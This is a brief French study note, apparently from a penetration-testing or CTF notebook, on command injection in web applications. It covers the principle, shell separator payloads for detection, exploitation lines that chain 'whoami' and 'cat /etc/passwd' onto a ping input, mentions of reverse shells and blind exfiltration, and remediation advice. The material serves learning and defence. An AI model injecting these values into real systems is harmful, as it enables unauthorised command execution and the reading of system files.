---
technique: "Command Injection"
os: Web
categorie: Exploitation
tags: [technique, web, injection]
rooms: []
---
# Command Injection
## Principe
> Une appli passe une entrée utilisateur directement à une commande système sans filtrage → on injecte nos propres commandes.
## Détection
Enchaîner une commande via un séparateur dans un champ qui semble exécuter qqch (ping, lookup...) :
```
; id
&& id
| id
`id`
$(id)
```
## Exploitation
```bash
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
# Puis reverse shell → voir Reverse-Shells
```
- **Blind** (pas de retour visible) : exfiltration via DNS/HTTP, ou `sleep 5` pour confirmer.
## Remédiation
- Ne jamais passer d'entrée à un shell ; utiliser des API sûres, whitelister, échapper.
